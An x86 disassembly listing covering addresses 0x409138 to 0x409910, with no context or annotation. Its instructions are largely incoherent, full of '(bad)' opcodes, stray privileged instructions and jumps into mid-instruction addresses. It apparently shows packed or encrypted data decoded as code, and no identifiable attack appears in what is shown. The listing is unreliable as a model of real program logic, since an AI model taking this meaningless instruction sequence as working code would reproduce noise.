  409138:	adc    al,0x21
  40913a:	cs jae 0x4091bb
  40913d:	mov    al,0xc0
  40913f:	add    eax,0xcd2afe95
  409144:	push   ecx
  409145:	mov    BYTE PTR [ebx+0x11e19d33],dh
  40914b:	inc    esp
  40914c:	cmp    ecx,edx
  40914e:	push   edi
  40914f:	arpl   WORD PTR ds:0x443d5bc1,bp
  409155:	add    DWORD PTR [ebx+0x52c3f2b2],ebp
  40915b:	sbb    eax,0x62bea070
  409160:	xlat   BYTE PTR ds:[ebx]
  409161:	dec    edx
  409162:	fimul  WORD PTR [ebp-0x6d]
  409165:	mov    esi,esp
  409167:	mov    esi,0xba7c1925
  40916c:	imul   ecx,DWORD PTR [ebx],0xffffff9a
  40916f:	imul   ecx,DWORD PTR [ebp+edi*1+0x28c7c27c],0x7cbec308
  40917a:	retf   0x508b
  40917d:	xor    dh,BYTE PTR [ebp-0x2244e78f]
  409183:	mov    ebx,0x339bd1fa
  409188:	and    bh,ah
  40918a:	xchg   ebx,eax
  40918b:	sub    eax,0xcfd9fa64
  409190:	mov    al,ds:0x102479de
  409195:	xchg   BYTE PTR [edi+0x58],bl
  409198:	(bad)  
  409199:	(bad)  
  40919b:	icebp  
  40919c:	cs adc al,0xbe
  40919f:	pop    ds
  4091a0:	int    0xdd
  4091a2:	sbb    eax,0x1576dd6c
  4091a7:	pop    es
  4091a8:	ss clc 
  4091aa:	pop    ss
  4091ab:	or     al,0xef
  4091ad:	int3   
  4091ae:	fnstsw WORD PTR [esi]
  4091b0:	aas    
  4091b1:	es mov edx,0xfa89a110
  4091b7:	and    eax,0x674b6f03
  4091bc:	push   cs
  4091bd:	add    DWORD PTR [edx-0x73],0xffffff9b
  4091c1:	jno    0x4091ac
  4091c3:	jecxz  0x40917a
  4091c5:	test   eax,0x1cfa5138
  4091ca:	jle    0x409207
  4091cc:	jg     0x4091da
  4091ce:	add    al,0x17
  4091d0:	outs   dx,BYTE PTR ds:[esi]
  4091d1:	(bad)  
  4091d2:	int3   
  4091d3:	enter  0xde0,0xc1
  4091d7:	fmul   st,st(2)
  4091d9:	ins    BYTE PTR es:[edi],dx
  4091da:	and    DWORD PTR [ebx+0xa],edx
  4091dd:	mov    dl,0xc5
  4091df:	ja     0x4091b2
  4091e1:	and    bh,BYTE PTR [eax]
  4091e3:	test   DWORD PTR [edi-0x6e],ebx
  4091e6:	add    ebp,DWORD PTR [ebp+0x3e4f4211]
  4091ec:	lods   eax,DWORD PTR ds:[esi]
  4091ed:	test   al,0x9c
  4091ef:	jp     0x4091f7
  4091f1:	fucomi st,st(4)
  4091f3:	and    dh,BYTE PTR [edx]
  4091f5:	clc    
  4091f6:	xchg   ebp,eax
  4091f7:	push   edi
  4091f8:	add    eax,0xf0fba712
  4091fd:	inc    ebp
  4091fe:	sbb    ecx,edx
  409200:	test   DWORD PTR ds:0xcec633de,0x30d3da7f
  40920a:	dec    esp
  40920b:	sub    ebp,DWORD PTR [esi+0x4532d15b]
  409211:	fisttp DWORD PTR [ebx-0x58961102]
  409217:	jg     0x409272
  409219:	pop    eax
  40921a:	jnp    0x40928d
  40921c:	gs jge 0x40927c
  40921f:	les    esp,FWORD PTR [ebx+0x1b2d0609]
  409225:	scas   al,BYTE PTR es:[edi]
  409226:	aas    
  409227:	pop    ecx
  409228:	jge    0x4091b2
  40922a:	or     esp,esi
  40922c:	je     0x409254
  40922e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40922f:	push   edi
  409230:	sbb    edx,DWORD PTR [eax+0x79]
  409233:	fist   WORD PTR ds:0x12686876
  409239:	mov    WORD PTR ds:0x4b38f5a8,fs
  40923f:	(bad)  
  409240:	mov    ch,0xab
  409242:	dec    ebp
  409243:	adc    bl,BYTE PTR [ebx]
  409245:	fadd   DWORD PTR [ebx+ebx*4+0x12]
  409249:	push   eax
  40924a:	loope  0x409265
  40924c:	or     cl,ch
  40924e:	cmp    al,0x53
  409250:	outs   dx,DWORD PTR ds:[esi]
  409251:	(bad)  
  409253:	mov    eax,cs
  409255:	xor    eax,DWORD PTR [esi-0x5f]
  409258:	mov    ebp,0xdcf90551
  40925d:	push   ds
  40925e:	idiv   al
  409260:	cmp    al,0x82
  409262:	das    
  409263:	pushf  
  409264:	retf   
  409265:	cmp    ch,ah
  409267:	add    esi,esp
  409269:	popa   
  40926a:	add    al,0x39
  40926c:	outs   dx,DWORD PTR ds:[esi]
  40926d:	arpl   WORD PTR [edx],bx
  40926f:	jg     0x4092cd
  409271:	ins    BYTE PTR es:[edi],dx
  409272:	fwait
  409273:	add    eax,0x6013f7d2
  409278:	add    al,0x79
  40927a:	ret    
  40927b:	push   cs
  40927c:	mov    ebp,ecx
  40927e:	cdq    
  40927f:	out    dx,al
  409280:	add    BYTE PTR [edi+ebp*4+0x34632cc6],0xfc
  409288:	mov    WORD PTR [eax],cs
  40928a:	xlat   BYTE PTR ds:[ebx]
  40928b:	scas   eax,DWORD PTR es:[edi]
  40928c:	test   DWORD PTR [eax+0x14],edx
  40928f:	xchg   BYTE PTR [edi-0x6],ah
  409292:	cmp    BYTE PTR [esi-0x6a],0x79
  409296:	dec    ebp
  409297:	fwait
  409298:	xor    ch,BYTE PTR [ebx-0x7d]
  40929b:	ins    DWORD PTR es:[edi],dx
  40929c:	scas   eax,DWORD PTR es:[edi]
  40929d:	adc    eax,DWORD PTR [ebx-0x2e]
  4092a0:	sub    dl,0xe9
  4092a3:	pushf  
  4092a4:	arpl   bx,di
  4092a6:	(bad)  
  4092a7:	ror    DWORD PTR [edi+0x11],cl
  4092aa:	repz imul esi,DWORD PTR [esi],0xf238eb87
  4092b1:	fistp  QWORD PTR [edi]
  4092b3:	dec    eax
  4092b4:	mov    cl,0x28
  4092b6:	jecxz  0x40929b
  4092b8:	outs   dx,BYTE PTR ds:[esi]
  4092b9:	repz mov dh,0x97
  4092bc:	adc    edx,DWORD PTR [edx-0x16]
  4092bf:	xchg   BYTE PTR [edi-0x7f0fba06],bl
  4092c5:	ss jg  0x409257
  4092c8:	ins    DWORD PTR es:[edi],dx
  4092c9:	pop    edi
  4092ca:	clc    
  4092cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092cc:	nop
  4092cd:	cmp    BYTE PTR [ecx-0x527bdeac],0x75
  4092d4:	ins    DWORD PTR es:[edi],dx
  4092d5:	out    0x1e,eax
  4092d7:	mov    ebx,0x2988833
  4092dc:	or     eax,0xca4e70da
  4092e1:	arpl   WORD PTR [edi-0x6f],si
  4092e4:	call   0x71a:0x7328d71a
  4092eb:	dec    ebx
  4092ec:	ds stos DWORD PTR es:[edi],eax
  4092ee:	xor    eax,0x3c6a03a
  4092f3:	push   eax
  4092f4:	jmp    0x409374
  4092f6:	jmp    0x409320
  4092f8:	jmp    0x40933c
  4092fa:	ror    BYTE PTR [eax+0x331fd051],1
  409300:	cwde   
  409301:	add    BYTE PTR [esi-0x46],0x83
  409305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409306:	mov    al,0x31
  409308:	cwde   
  409309:	ret    
  40930a:	ins    DWORD PTR es:[edi],dx
  40930b:	fsubr  DWORD PTR [ebp+0x299cb89a]
  409311:	rol    esi,1
  409313:	xor    edx,DWORD PTR [esi+0x390d7d47]
  409319:	lds    edi,FWORD PTR [eax+0x30a2397e]
  40931f:	mov    eax,ds:0x3fdf8330
  409324:	inc    ecx
  409325:	add    DWORD PTR [esi-0x75],0x19bd5d84
  40932c:	xchg   DWORD PTR [edi-0x72],edi
  40932f:	fchs   
  409331:	or     ecx,DWORD PTR [edx]
  409333:	out    0x99,al
  409335:	push   edi
  409336:	in     al,dx
  409337:	cmp    cl,BYTE PTR [eax-0x3e]
  40933a:	clc    
  40933b:	inc    eax
  40933c:	test   al,0x4a
  40933f:	std    
  409340:	imul   BYTE PTR [ebp-0x42]
  409343:	mov    esp,DWORD PTR [eax]
  409345:	push   eax
  409346:	outs   dx,BYTE PTR ds:[esi]
  409347:	adc    BYTE PTR [ebp+0x726faf18],0x17
  40934e:	(bad)  
  409350:	and    esp,edi
  409352:	add    bl,ah
  409354:	dec    ebx
  409355:	adc    BYTE PTR [ebx],al
  409357:	lods   eax,DWORD PTR ds:[esi]
  409358:	adc    al,0x57
  40935a:	push   esp
  40935b:	jmp    0x772b:0xa7c5eac4
  409362:	(bad)  
  409363:	stos   DWORD PTR es:[edi],eax
  409364:	int3   
  409365:	add    eax,0x174a4b8c
  40936a:	pusha  
  40936b:	xchg   ch,bl
  40936d:	pusha  
  40936e:	nop
  40936f:	addr16 jo 0x409376
  409372:	retf   0x82a6
  409375:	lods   eax,DWORD PTR ds:[esi]
  409376:	fs jb  0x409318
  409379:	out    dx,al
  40937a:	add    BYTE PTR ds:0xa35f280a,ah
  409380:	lds    ebx,FWORD PTR [ebx-0x6a5cd37e]
  409386:	push   edx
  409387:	aas    
  409388:	lock aas 
  40938a:	into   
  40938b:	sbb    BYTE PTR gs:[ebp+0x7056fd8c],dh
  409392:	jl     0x409374
  409394:	fistp  DWORD PTR [ebp-0x71]
  409397:	push   ds
  409398:	pushf  
  409399:	cwde   
  40939a:	dec    eax
  40939b:	ret    
  40939c:	sbb    bh,ch
  40939e:	push   eax
  40939f:	bound  esi,QWORD PTR gs:[ebp+0xbb5f15f]
  4093a6:	mov    ch,0xbd
  4093a8:	xchg   edx,eax
  4093a9:	cli    
  4093aa:	test   ch,al
  4093ac:	bound  esp,QWORD PTR [ecx+eiz*4-0xb9ad54e]
  4093b3:	jmp    0x409350
  4093b5:	jns    0x4093a3
  4093b7:	mov    eax,eax
  4093b9:	iret   
  4093ba:	aas    
  4093bb:	fnsave [edi+0x23f075cc]
  4093c1:	push   0xffffff97
  4093c3:	xor    ecx,esi
  4093c5:	pop    esp
  4093c6:	sub    ch,BYTE PTR [edx-0x260aa843]
  4093cc:	aam    0xa1
  4093ce:	popa   
  4093cf:	addr16 cmp eax,0xee5c4459
  4093d5:	frstor [ebp+0x572b8c62]
  4093db:	fcomp  DWORD PTR [eax+0x29]
  4093de:	xchg   BYTE PTR [eax+0x2],dl
  4093e1:	xchg   esi,eax
  4093e2:	(bad)  
  4093e3:	in     al,dx
  4093e4:	ins    BYTE PTR es:[edi],dx
  4093e5:	int    0xca
  4093e7:	mov    edi,0xa5150f8b
  4093ec:	(bad)  [edx+0x65a0bcd5]
  4093f2:	mov    bl,0x58
  4093f4:	mov    dh,0x34
  4093f6:	adc    eax,0x7c595a6a
  4093fb:	in     al,0xb0
  4093fd:	ficom  WORD PTR fs:[ebp-0x3c]
  409401:	adc    esi,esi
  409403:	sbb    DWORD PTR [edi+0x70],eax
  409406:	pop    es
  409407:	mov    ebx,0xa8546e17
  40940c:	jae    0x409446
  40940e:	inc    edx
  40940f:	addr16 mov ch,0x57
  409412:	(bad)  
  409413:	mov    ch,bh
  409415:	push   es
  409416:	xor    DWORD PTR [ebx],eax
  409418:	jg     0x40940f
  40941a:	stos   BYTE PTR es:[edi],al
  40941b:	adc    dh,BYTE PTR [ecx-0x56]
  40941e:	pop    edx
  40941f:	jecxz  0x4093f3
  409421:	iret   
  409422:	xchg   DWORD PTR [ebp+0x5308b60c],esi
  409428:	repnz mov BYTE PTR [esi-0x547c2dd2],bl
  40942f:	or     al,0x4e
  409431:	push   cs
  409432:	xchg   ebx,eax
  409433:	aam    0x12
  409435:	mov    cl,0xc7
  409437:	pushf  
  409438:	in     eax,0x5f
  40943a:	cmp    ah,bh
  40943c:	and    ah,BYTE PTR [edx]
  40943e:	imul   eax,DWORD PTR [edx+eax*4-0x661ab2e3],0x60
  409446:	repz imul eax,DWORD PTR [esi+0x384df750],0xaf2d7840
  409451:	pushf  
  409452:	or     DWORD PTR [ecx+0x70],0x7a3b8706
  409459:	daa    
  40945a:	sbb    edx,DWORD PTR [eax+0x4b979a1a]
  409460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409461:	les    edi,FWORD PTR [esi+esi*2-0x2c]
  409465:	sbb    DWORD PTR ds:[edi+edx*8-0x6a6c13c7],ebx
  40946d:	jp     0x409437
  40946f:	or     esp,edi
  409471:	stos   BYTE PTR es:[edi],al
  409472:	cwde   
  409473:	add    BYTE PTR [ecx+0x1c],cl
  409476:	les    edi,FWORD PTR [edi-0x2b]
  409479:	test   al,0xee
  40947b:	inc    esi
  40947c:	repz int3 
  40947e:	dec    esi
  40947f:	cmp    DWORD PTR [esi+0x17e37bc8],esi
  409485:	nop
  409486:	jmp    0x40945f
  409488:	pushf  
  409489:	pop    ecx
  40948a:	dec    esi
  40948b:	mov    ds:0x6aabab2e,eax
  409490:	push   es
  409491:	test   cl,ch
  409493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409494:	in     eax,dx
  409495:	dec    eax
  409496:	jb     0x409438
  409498:	pop    ss
  409499:	outs   dx,BYTE PTR ds:[esi]
  40949a:	add    eax,0xa9520dc7
  40949f:	(bad)  
  4094a0:	sbb    DWORD PTR [esi+0x35],ebp
  4094a3:	xor    bl,bh
  4094a5:	xor    eax,0x72345414
  4094aa:	xor    DWORD PTR [edi],ebp
  4094ac:	pop    ebx
  4094ad:	clc    
  4094ae:	out    dx,eax
  4094af:	imul   eax,DWORD PTR [ebx],0x66
  4094b2:	outs   dx,BYTE PTR ds:[esi]
  4094b3:	dec    ebp
  4094b4:	mov    esi,0xce523fa3
  4094b9:	dec    edi
  4094ba:	jle    0x409461
  4094bc:	ss daa 
  4094be:	add    dh,BYTE PTR ss:[ecx+0x3bbfcc55]
  4094c5:	pop    edx
  4094c6:	enter  0x506f,0x17
  4094ca:	dec    BYTE PTR [edx+0x53]
  4094cd:	sub    eax,0xdc88be4c
  4094d2:	(bad)  
  4094d3:	and    edx,DWORD PTR [ebp+0x73]
  4094d6:	add    BYTE PTR [ebp+0x432e9d46],ch
  4094dc:	(bad)  
  4094dd:	dec    ebp
  4094de:	inc    edi
  4094df:	data16 scas al,BYTE PTR es:[edi]
  4094e1:	dec    edx
  4094e2:	lock dec edx
  4094e4:	jmp    0xac52:0x9aba85e8
  4094eb:	push   ds
  4094ec:	scas   eax,DWORD PTR es:[edi]
  4094ed:	pop    esp
  4094ee:	or     al,0xe3
  4094f0:	shl    BYTE PTR [edx-0x15764e7e],cl
  4094f6:	jmp    0x409502
  4094f8:	sub    esp,DWORD PTR [ecx-0x6bd3c736]
  4094fe:	test   BYTE PTR [ecx+0x23],dh
  409501:	push   edi
  409502:	ret    
  409503:	xor    DWORD PTR [edx+0x61],esp
  409506:	mov    al,0xc
  409508:	inc    esp
  409509:	pop    ss
  40950a:	mov    ebp,0x8e2af424
  40950f:	sub    eax,0x7ce96377
  409514:	mov    edx,0x4e55b9be
  409519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40951a:	mov    eax,0xafacbfaa
  40951f:	inc    ebp
  409520:	lea    ebx,[esi]
  409522:	xchg   edi,eax
  409523:	push   esp
  409524:	fidiv  DWORD PTR [edx+ecx*1-0x7e]
  409528:	jnp    0x409579
  40952a:	mov    ebx,0x84ea0938
  40952f:	push   cs
  409530:	jae    0x409574
  409532:	mov    ds:0xc4ddee55,eax
  409537:	gs cwde 
  409539:	outs   dx,BYTE PTR ds:[esi]
  40953a:	cwde   
  40953b:	ss mov esp,0x834cd2bc
  409541:	xchg   ecx,eax
  409542:	out    dx,al
  409543:	add    DWORD PTR es:[ecx-0x707c260e],edi
  40954a:	(bad)  
  40954b:	hlt    
  40954c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40954d:	fcmovnbe st,st(0)
  40954f:	mov    dh,0xe8
  409551:	add    eax,0xfbbe359
  409556:	repz push es
  409558:	in     al,0x2d
  40955a:	ficomp DWORD PTR [edx+0x73]
  40955d:	cs test eax,0x6306a1d6
  409563:	lahf   
  409564:	sub    eax,0x3998147b
  409569:	fild   WORD PTR [eax-0x2dbf3eaa]
  40956f:	out    dx,eax
  409570:	push   ecx
  409571:	push   cs
  409572:	mov    bl,0xd4
  409574:	imul   esp,ebx,0xc5aa9498
  40957a:	cmp    DWORD PTR [edx-0x7b],eax
  40957d:	fwait
  40957e:	pop    ds
  40957f:	inc    ebx
  409580:	test   al,0x6e
  409582:	sar    DWORD PTR [ebx],0xea
  409585:	sub    ebp,eax
  409587:	test   BYTE PTR [eax+0x2474c278],bh
  40958d:	ds aas 
  40958f:	stos   DWORD PTR es:[edi],eax
  409590:	cmp    DWORD PTR [edx+0x320c5e90],0x275b1d39
  40959a:	fwait
  40959b:	mov    ecx,0x1420a3f7
  4095a0:	push   ds
  4095a1:	cmp    al,BYTE PTR [ecx+esi*4+0x3624f576]
  4095a8:	scas   al,BYTE PTR es:[edi]
  4095a9:	jge    0x40956c
  4095ab:	add    DWORD PTR [eax-0x45],ebx
  4095ae:	js     0x40960b
  4095b0:	out    dx,eax
  4095b1:	call   0xb2f14539
  4095b6:	aaa    
  4095b7:	lock (bad) 
  4095b9:	push   0xffffffac
  4095bb:	inc    ebx
  4095bc:	ret    
  4095bd:	push   ds
  4095be:	xchg   edi,eax
  4095bf:	or     al,0xce
  4095c1:	out    dx,eax
  4095c2:	or     BYTE PTR [edx+ebp*8-0x1f2e544b],ch
  4095c9:	pop    esi
  4095ca:	ficomp DWORD PTR [ecx]
  4095cc:	dec    esp
  4095cd:	add    DWORD PTR [esi+0x56],0xfffffffa
  4095d1:	cdq    
  4095d2:	stc    
  4095d3:	inc    eax
  4095d4:	ins    BYTE PTR es:[edi],dx
  4095d5:	cwde   
  4095d6:	and    eax,0x3bf1b3f2
  4095db:	or     DWORD PTR [ebx-0x629c7998],esi
  4095e1:	jmp    0x86cc7ba
  4095e6:	mov    gs,WORD PTR [ecx]
  4095e8:	adc    bh,BYTE PTR [eax]
  4095ea:	call   0xca334601
  4095ef:	(bad)  
  4095f0:	jle    0x4095e7
  4095f2:	cmp    eax,eax
  4095f4:	nop
  4095f5:	out    dx,al
  4095f6:	in     eax,dx
  4095f7:	popf   
  4095f8:	add    esi,DWORD PTR [eax+0x7]
  4095fb:	mov    ecx,0x4bf6f4b6
  409600:	push   esp
  409601:	mov    bh,0xb1
  409603:	mov    ebp,0x6cd3735
  409608:	push   ebx
  409609:	lods   eax,DWORD PTR ds:[esi]
  40960a:	inc    eax
  40960b:	jnp    0x40965f
  40960d:	retf   
  40960e:	cwde   
  40960f:	add    al,0xc9
  409611:	sbb    al,cl
  409613:	jmp    0x2699304c
  409618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409619:	inc    eax
  40961a:	xor    al,0xaf
  40961c:	mov    ebp,0x92b5bb9a
  409621:	inc    ebp
  409622:	outs   dx,DWORD PTR ds:[esi]
  409623:	inc    edi
  409624:	into   
  409625:	dec    esp
  409626:	dec    eax
  409627:	mov    al,BYTE PTR [eax+0x70]
  40962a:	pop    ebx
  40962b:	ja     0x4096a0
  40962d:	dec    edx
  40962e:	inc    edi
  40962f:	or     ecx,esi
  409631:	sbb    DWORD PTR [ebp+0x66],edx
  409634:	outs   dx,DWORD PTR ds:[esi]
  409635:	leave  
  409636:	test   al,0xa4
  409638:	fcmovb st,st(4)
  40963a:	dec    edx
  40963b:	jmp    0x14480133
  409640:	out    0x27,al
  409642:	pusha  
  409643:	adc    BYTE PTR [edi-0x504ec34f],ch
  409649:	pop    edx
  40964a:	and    ebx,esi
  40964c:	pop    ecx
  40964d:	adc    BYTE PTR [edx+0x51],bl
  409650:	sbb    al,ah
  409652:	xchg   DWORD PTR [ecx-0x4daabe4e],esi
  409658:	ins    BYTE PTR es:[edi],dx
  409659:	retf   0x30a7
  40965c:	and    edx,DWORD PTR [esp+eax*8+0x51cd868a]
  409663:	jae    0x4095f3
  409665:	scas   eax,DWORD PTR es:[edi]
  409666:	xchg   esp,eax
  409667:	and    BYTE PTR [ebx+0x6b],0x8f
  40966b:	in     eax,0x5f
  40966d:	push   ds
  40966e:	iret   
  40966f:	push   ecx
  409670:	shr    DWORD PTR [edi-0x3d],0x94
  409674:	dec    esi
  409675:	dec    ebx
  409676:	jbe    0x40963b
  409678:	stos   BYTE PTR es:[edi],al
  409679:	imul   DWORD PTR [ebp-0x7f]
  40967c:	jmp    0x87ad:0xf90d1c06
  409683:	jnp    0x4096f2
  409685:	cdq    
  409686:	repnz cmp edi,DWORD PTR [ebx+0xbd51421]
  40968d:	(bad)  
  40968e:	test   al,0x1e
  409690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409691:	mov    edx,0xb9d196a3
  409696:	cli    
  409697:	lahf   
  409698:	jl     0x40962f
  40969a:	mov    BYTE PTR ds:0x7e111f24,ah
  4096a0:	adc    eax,0x95d18952
  4096a5:	ret    
  4096a6:	rcl    edi,1
  4096a8:	dec    esi
  4096a9:	mov    ebp,0x8594c811
  4096ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096af:	lea    edx,[eax+0xa]
  4096b2:	or     ch,BYTE PTR [edi+0xfae63d4]
  4096b8:	sub    eax,0xbfdd4bb0
  4096bd:	retf   
  4096be:	(bad)  [ebx-0x35]
  4096c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096c2:	push   0x805aaf55
  4096c7:	scas   eax,DWORD PTR es:[edi]
  4096c8:	push   0x91536ed6
  4096cd:	js     0x4096c1
  4096cf:	mov    WORD PTR [eax+0x2340c7c7],gs
  4096d5:	(bad)  
  4096d6:	pop    ecx
  4096d7:	or     edi,edi
  4096d9:	cmc    
  4096da:	inc    eax
  4096db:	loop   0x4096a0
  4096dd:	jns    0x409692
  4096df:	xchg   edx,eax
  4096e0:	mov    cl,BYTE PTR [ebx]
  4096e2:	or     eax,0x46890c98
  4096e7:	pop    ds
  4096e8:	push   ebx
  4096e9:	jge    0x4096ea
  4096eb:	mov    bh,0x37
  4096ed:	adc    bl,BYTE PTR [ecx]
  4096ef:	adc    al,0xc
  4096f1:	ret    
  4096f2:	xchg   ecx,eax
  4096f3:	xchg   ebp,eax
  4096f4:	pop    esp
  4096f5:	dec    eax
  4096f6:	xchg   edx,eax
  4096f7:	(bad)  
  4096f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096f9:	lock mov eax,0xe4825602
  4096ff:	inc    ebx
  409700:	fmul   DWORD PTR [esi+0x52]
  409703:	neg    DWORD PTR [edi-0x3f]
  409706:	test   al,0x59
  409708:	je     0x40977d
  40970a:	mov    cl,0x26
  40970c:	hlt    
  40970d:	pop    esi
  40970e:	xchg   DWORD PTR [eax+0xb],esi
  409711:	add    BYTE PTR [edi+0x793f268],0xcf
  409718:	mov    fs,ebx
  40971a:	repnz sub al,0xa0
  40971d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40971e:	jae    0x40974f
  409720:	jb     0x4096e0
  409722:	cmp    al,0x45
  409724:	cmp    al,0x2b
  409726:	pop    ebp
  409727:	repnz mov ecx,0x54b44258
  40972d:	not    edi
  40972f:	fstp   QWORD PTR ds:0xec5acf11
  409735:	mov    ecx,0x6b9e5b53
  40973a:	mov    esi,0xea65e9be
  40973f:	ret    0x27e6
  409742:	jne    0x409735
  409744:	dec    ebx
  409745:	dec    esp
  409746:	xlat   BYTE PTR ds:[ebx]
  409747:	or     al,0x61
  409749:	bound  eax,QWORD PTR [ebx+ebp*1]
  40974c:	in     eax,dx
  40974d:	hlt    
  40974e:	pop    edi
  40974f:	xchg   edi,eax
  409750:	popa   
  409751:	ds xchg ecx,eax
  409753:	sbb    eax,0x1fdb2267
  409758:	add    bl,ch
  40975a:	pushf  
  40975b:	add    DWORD PTR [ebx],ebp
  40975d:	call   0xbd29:0xf38be6cc
  409764:	adc    eax,0xf6984bba
  409769:	push   ecx
  40976a:	shl    BYTE PTR [edi+eiz*8-0x6e6ae265],0x7
  409772:	pop    esp
  409773:	dec    edx
  409774:	inc    ecx
  409775:	jmp    0xd622:0xbbfdfc44
  40977c:	adc    dh,BYTE PTR [ecx]
  40977e:	clc    
  40977f:	das    
  409780:	sub    dh,bl
  409782:	push   cs
  409783:	jmp    eax
  409785:	(bad)  
  409786:	pop    ecx
  409787:	mov    dh,0xbe
  409789:	sti    
  40978a:	in     al,0xe5
  40978c:	pop    ebx
  40978d:	inc    ebp
  40978e:	test   ah,bl
  409790:	jge    0x409777
  409792:	jae    0x40979c
  409794:	fdivr  QWORD PTR [edi]
  409796:	push   0xffffffcb
  409798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409799:	jmp    0x409739
  40979b:	shl    BYTE PTR [esi],cl
  40979d:	adc    bh,dl
  40979f:	lock mov esi,0x435d6fac
  4097a5:	mov    ecx,0x3b9eb518
  4097aa:	fcomip st,st(6)
  4097ac:	pop    ebx
  4097ad:	sbb    al,BYTE PTR [ebx+0x64]
  4097b0:	lahf   
  4097b1:	jns    0x4097b4
  4097b3:	popa   
  4097b4:	inc    esi
  4097b5:	aam    0x2a
  4097b7:	mov    edx,0xf47efaf0
  4097bc:	cmp    eax,DWORD PTR [edx+0x79de0def]
  4097c2:	inc    ecx
  4097c3:	mov    dh,0xff
  4097c5:	mov    al,0xa2
  4097c7:	mov    ebx,0x1fb811f0
  4097cc:	add    al,BYTE PTR [ecx+0x53]
  4097cf:	push   0xdd2c8af1
  4097d4:	mov    bl,0x95
  4097d6:	daa    
  4097d7:	mov    ds:0x1ba99f81,eax
  4097dc:	pop    edi
  4097dd:	add    esi,DWORD PTR [edi-0x10]
  4097e0:	push   esi
  4097e1:	mov    ebx,0x9d9f95d0
  4097e6:	sbb    al,0x70
  4097e8:	sbb    eax,ebp
  4097ea:	or     esi,ebp
  4097ec:	pop    ecx
  4097ed:	mov    eax,0x3c294bf2
  4097f2:	xchg   esp,eax
  4097f3:	add    bh,ah
  4097f5:	imul   edx,DWORD PTR [ebx+0x67f359a7],0x53ff5170
  4097ff:	div    DWORD PTR [ebx]
  409801:	and    eax,0xda732800
  409806:	(bad)  
  409808:	arpl   WORD PTR [ecx],ax
  40980a:	js     0x409797
  40980c:	inc    esi
  40980d:	sub    eax,0x921673ff
  409812:	sbb    BYTE PTR [ecx],dh
  409814:	mov    esi,0x29e28831
  409819:	add    ah,dl
  40981b:	test   DWORD PTR [ecx+0x41],ecx
  40981e:	pop    eax
  40981f:	pop    ds
  409820:	shl    BYTE PTR [ebx-0x78],1
  409823:	scas   al,BYTE PTR es:[edi]
  409824:	in     al,0xbd
  409826:	int    0xe1
  409828:	sub    eax,0x4eacbab1
  40982d:	cmp    DWORD PTR [edi],ebp
  40982f:	lds    esi,FWORD PTR [ebx+0x23ca49c7]
  409835:	cld    
  409836:	xlat   BYTE PTR ds:[ebx]
  409837:	mov    al,ds:0xadb6e15d
  40983c:	loop   0x409807
  40983e:	daa    
  40983f:	sub    al,0x99
  409841:	mov    eax,ds:0xc650d626
  409846:	aas    
  409847:	mov    cl,0x95
  409849:	inc    ecx
  40984a:	sub    dh,BYTE PTR [esi]
  40984c:	pxor   mm1,mm5
  40984f:	arpl   cx,si
  409851:	add    BYTE PTR [edi-0x7352fdb7],bl
  409857:	int    0xca
  409859:	and    al,0x20
  40985b:	mov    WORD PTR [ecx+0x10],?
  40985e:	loopne 0x40983d
  409860:	sbb    eax,0x72cf57d3
  409865:	jo     0x4098de
  409867:	loop   0x409852
  409869:	lea    esp,[esi]
  40986b:	fwait
  40986c:	and    DWORD PTR [edi+0x191a11b7],eax
  409872:	inc    ebp
  409873:	dec    ebp
  409874:	dec    eax
  409875:	lea    eax,[edi]
  409877:	mov    ss,eax
  409879:	nop
  40987a:	push   ebp
  40987b:	aaa    
  40987c:	push   ss
  40987d:	dec    ebp
  40987e:	dec    edi
  40987f:	rcl    BYTE PTR [ecx-0x49],cl
  409882:	cdq    
  409883:	pop    eax
  409884:	pop    ss
  409885:	data16 jns 0x409898
  409888:	jge    0x40980b
  40988a:	cmp    eax,0x943fdd39
  40988f:	xchg   ebp,eax
  409890:	mov    al,ds:0xb5f96218
  409895:	adc    al,0x59
  409897:	mov    esi,0xa4ff7865
  40989c:	jne    0x409855
  40989e:	sub    eax,0x864071a8
  4098a3:	cwde   
  4098a4:	ds test eax,0x378fdddc
  4098aa:	loopne 0x409831
  4098ac:	cmp    BYTE PTR [esi-0x78ad3de5],bl
  4098b2:	adc    BYTE PTR [edx],ah
  4098b4:	xchg   esp,eax
  4098b5:	sbb    al,0x15
  4098b7:	ja     0x4098a8
  4098b9:	mov    bh,0x82
  4098bb:	pop    ecx
  4098bc:	or     esi,DWORD PTR [ebp-0x63]
  4098bf:	sub    eax,0xc41588e1
  4098c4:	push   esp
  4098c5:	stc    
  4098c6:	add    al,0x33
  4098c8:	mov    dh,0x5a
  4098ca:	aaa    
  4098cb:	mov    cl,0xc0
  4098cd:	sbb    al,0x69
  4098cf:	mov    ah,0xaf
  4098d1:	or     al,0xf6
  4098d3:	iret   
  4098d4:	jb     0x4098b6
  4098d6:	add    eax,0xbffb9198
  4098db:	(bad)  
  4098dc:	aad    0x3e
  4098de:	mov    eax,0x5fb49659
  4098e3:	xchg   BYTE PTR [eax],dh
  4098e5:	cmp    al,0x93
  4098e7:	stos   DWORD PTR es:[edi],eax
  4098e8:	data16 mov al,0x36
  4098eb:	into   
  4098ec:	xor    ch,BYTE PTR [eax-0x7632f140]
  4098f2:	imul   bh
  4098f4:	imul   ecx,edx,0x75
  4098f7:	out    dx,eax
  4098f8:	inc    ecx
  4098f9:	shl    BYTE PTR [ecx+0x54],cl
  4098fc:	mov    ss,WORD PTR [edx+0x49cc7e2]
  409902:	cwde   
  409903:	ins    DWORD PTR es:[edi],dx
  409904:	(bad)  
  409905:	mov    edx,0x4ffa124d
  40990a:	loope  0x409947
  40990c:	ret    0x6a9d
  40990f:	icebp  
  409910:	inc    edi
